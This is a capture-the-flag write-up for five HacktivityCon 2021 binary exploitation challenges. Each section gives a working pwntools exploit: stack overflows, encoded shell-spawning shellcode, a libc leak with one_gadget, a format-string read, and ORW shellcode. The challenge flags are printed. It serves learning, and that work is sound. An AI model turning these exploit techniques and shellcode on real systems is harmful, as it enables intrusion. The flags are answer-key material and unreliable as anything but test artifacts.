---
title: HacktivityCon 2021 Pwn
tags: [hacktivitycon, ctf, writeup]
description: This is an exploit writeup for pwn challenges from hacktivitycon
---

# Tasks

#### easy
* retcheck
* shellcoded
* the library
* faucet

#### medium
* yabo

> you can find challenges and exploit <a href="https://github.com/kirimoe/hacktivitycon2021">Here</a>

# retcheck (easy)
<img src="/assets/img/hacktivitycon/retcheck.png">

This was a easy level challenge all you have to do is overwrite the return address with address of function <span style="color:red">`win`</span> but with a twist and here it is

<img src="/assets/img/hacktivitycon/check.png">

this piece of code checks if we ovewrite the address of the function <span style="color:red">`vuln`</span> in which overflow was occured. If that return address is overwritten then it calls <span style="color:red">`abort`</span> thats why name is <span style="color:red">`retcheck`</span>

then how to call <span style="color:red">`win`</span> right? well we can overwrite the return address of main which is few offsets away from return address of <span style="color:red">`vuln`</span>

```python
from pwn import *
context.arch = 'amd64'

offset = 0x190+8
payload = b""
payload += b"A" * offset
payload += p64(0x401465)
payload += cyclic(cyclic_find(0x61616163))
payload += p64(0x4012e9)

flag = False

if flag:
    p = process("./retcheck")
else:
    p = remote("challenge.ctf.games",31463)

p.recv()
p.sendline(payload)
print(p.recvall())
```

<img src="/assets/img/hacktivitycon/retcheck_sol.png">

flag is <span style="color:red">`flag{a73dc20c1cd1f918ae7b591e8625e349}`</span>

# shellcoded (easy)
<img src="/assets/img/hacktivitycon/shellcoded.png">

<span style="color:red">`shellcode + encoded = shellcoded`</span> I guess this is what they meant cause this challenge was pretty straight forward all it does it takes shellcode as a user input and executes it. 

Not that hard right 😂 except it performs some encoding on shellcode and the encoding is, it iterates over the length of the shellcode and for every odd counter value it subtracts counter value from shellcode byte and for every even counter value it does exact opposite means instead of subtracting it adds the counter value to shellcode byte.

```python
for example :

shellcode = "ABCD"

for i in range(len(shellcode)):
    shellcode[i] = shellcode[i] - i if i & 1 else shellcode[i] + i
```

reversing the encoding algorithm isn't that hard but keep in mind that byte value ranges from <span style="color:red">`0 to 255`</span> or <span style="color:red">`0x0 to 0xff`</span> what I mean by that lets take a scenario the <span style="color:red">`syscall`</span> instruction has opcode of <span style="color:red">`\x0f\x05(0x0f 0x05)`</span> now either <span style="color:red">`0x0f`</span> or <span style="color:red">`0x05`</span> is going to be at the odd index right? so if your shellcodes length is greater than <span style="color:red">`0x0f`</span> boom 💥 now your byte will go into negative cause of your reversing algorithm and your shellcodes broken now

Then what we gonna do? just arrange the shellcode instruction accordingly and your are good to go

```python
def shellcode_generator():
    shellcode = asm('''
                    jmp main
                sys:
                    syscall
                main:
                    xor rdx, rdx
                    xor rsi, rsi
                    mov rbx,0x0068732f6e69622f
                    push rbx
                    push rsp
                    pop rdi
                    mov al, 59
                    je sys
            ''')

    shellcode = list(shellcode)
    return shellcode_filter(shellcode)

shellcode = shellcode_generator()

flag = True

if flag:
    p = process("./shellcoded")
else:
    p = remote("challenge.ctf.games",32383)

p.recv()
p.send(shellcode)
p.interactive()
```

<img src="/assets/img/hacktivitycon/shellcoded_sol.png">

flag is <span style="color:red">`flag{f27646ae277113d24c73dbc66a816721}`</span>

# the library (easy)
<img src="/assets/img/hacktivitycon/the_library.png">

the challenge prints some book names and ask for you to guess which book the challenge is thinking of now and that field has a <span style="color:red">buffer overflow vulnerability</span>

<img src="/assets/img/hacktivitycon/library.png">

Exploit will go something like this first we will use <span style="color:red">`ret2puts`</span> (You can <a href="https://kirimoe.github.io/tmu-ctf-pwn/#fakesurvey">Click Here</a> to see how ret2puts works) and then we will use <span style="color:red">`one_gadget`</span> which will drop us a shell.

```json
exp1 : [padding][pop_rdi_gadget][puts.got][puts.plt][main]
exp2 : [padding][onegadget]
```

<span style="color:red">`one_gadget`</span> is a tool which will find the offsets in <span style="color:red">`glibc`</span> which will execute <span style="color:red">`execve("/bin/sh",0,0)`</span>

<img src="/assets/img/hacktivitycon/one_gadget.png">

```python
from pwn import *
context.arch = "amd64"

elf = ELF("the_library")
libc = ELF("libc-2.31.so")
rop = ROP("the_library")

offset = 0x220 + 8
padding = b""
padding += b"A" * offset

p = remote("challenge.ctf.games",30384)

def leak_libc_base():
    ropchain = flat(
            rop.rdi.address,
            elf.got['puts'],
            elf.plt['puts'],
            elf.symbols['main']
    )

    p.recv()
    p.sendline(padding + ropchain)
    p.recvuntil(b"Wrong :(\n")

    puts = u64(p.recv(6).ljust(8,b"\x00"))
    libc_base = puts - libc.symbols['puts']
    log.info("puts leak : " + hex(puts))
    log.info("libc base address : " + hex(libc_base))

    return libc_base

def one_gadget(libc_base):
    onegadget = libc_base + 0xe6c81
    p.recv()
    p.sendline(padding + p64(onegadget))
    p.interactive()

libc_base = leak_libc_base()
one_gadget(libc_base)
```
<img src="/assets/img/hacktivitycon/the_library_sol.png">

flag is <span style="color:red">`flag{54b7742240a85bf62aa6fcf16c7e66a4}`<span>

# faucet (easy)
<img src="/assets/img/hacktivitycon/faucet.png">

*IDK if it counts for the writeup or not but when I downloaded this challenge and played around with it it was already late night and I went to bed and solved this challenge this morning locally but when I open the ctf site for remote IP I saw ctf was already ended. But, still here it is*

After playing around with the binary cause it uses a switch case i found that 5th case allow us to buy an item and ask for the item name and after that it just prints out you bought XXXXX so our input was reflecting so I check for <span style="color:red">`format string`</span> and yep there it is it started printing values on stack.

when I open the binary in <span style="color:red">`binary ninja`</span> i found that the binary opens the <span style="color:red">`flag.txt`</span> and reads the flag in a global variable named <span style="color:red">`FLAG`</span>

<img src="/assets/img/hacktivitycon/flag.png">

I first look values on the stack and found that I can leak some address of binary as it was on the stack at 8th offset

```python
p.recv()
p.sendline(b"5")
p.recv()
p.sendline(b"%8$p")
p.recvuntil(b"have bought a ")
base = int(p.recv(14),16) - 0x1740
```

Then the <span style="color:red">`FLAG`</span> variable is at 0x4060 offset from base address of binary

Then all we have to do is print the flag address as string <span style="color:red">`%s`</span> and we will get our flag

```python
p.recv()
p.sendline(b"5")
p.recv()
payload = b"%7$s    "
payload += p64(base + 0x4060)
p.sendline(payload)
print(p.recv())
```

our input is at the 6th offset on stack so we can put our <span style="color:red">`%s`</span> modifier there and put address of <span style="color:red">`FLAG`</span> at the next offset which is 7th and thats why <span style="color:red">`%7$s`</span> and we will get our flag

*the reson why there are spaces after %7$s is cause we have to allign our address as a perfect 8 byte address*

<img src="/assets/img/hacktivitycon/faucet_sol.png">

flag is <span style="color:red">`flag{6bc75f21f8839ce0db898a1950d11ccf}`</span>

# yabo (medium)
<img src="/assets/img/hacktivitycon/yabo.png">

its a <span style="color:red">`32 bit buffer overflow + shellcoding challenge`</span> cause there are no mitigation I mean no pie, no canary, executable stack.

Binary executes then <span style="color:red">`fork()`</span> a child process which calls a <span style="color:red">`vuln()`</span> function in which overflow occurs.

So we can put shellcode <span style="color:red">`Simple ORW shellcode`</span> on stack but real question is where to return I mean we cannot leak stack address...

But, when i was debudding the binary in the <span style="color:red">`gdb`</span> and i was about to hit <span style="color:red">`ret`</span> I saw <span style="color:red">`eax`</span> was pointing to our shellcode so I look for some gadgets and found a gadget calling eax <span style="color:red">`call eax`</span> so I put that as return address boooom💥 code execution redirected and we got out flag

```python
from pwn import *
context.arch = 'i386'

shellcode = asm('''
                xor eax,eax
                xor ecx,ecx

                push eax
                push 0x7478742e
                push 0x67616c66
                mov ebx,esp
                
                mov al,5
                int 0x80

                xor ebx,ebx
                mov cl,al

                mov bl,4
                xor edx,edx

                mov al,187
                int 0x80
            ''')

callrax = 0x0804901d

offset = cyclic_find(0x6b61616c)

payload = b""
payload += shellcode
payload += b"\x90" * (offset - len(shellcode))
payload += p32(callrax)

p = remote("challenge.ctf.games",32762)
print(p.recv())
p.send(payload)
print(p.recvall())
```

<img src="/assets/img/hacktivitycon/yabo_sol.png">

flag is <span style="color:red">`flag{2f20f16416a066ca5d4247a438403f21}`</span>

> you can find challenges and exploit <a href="https://github.com/kirimoe/hacktivitycon2021">Here</a>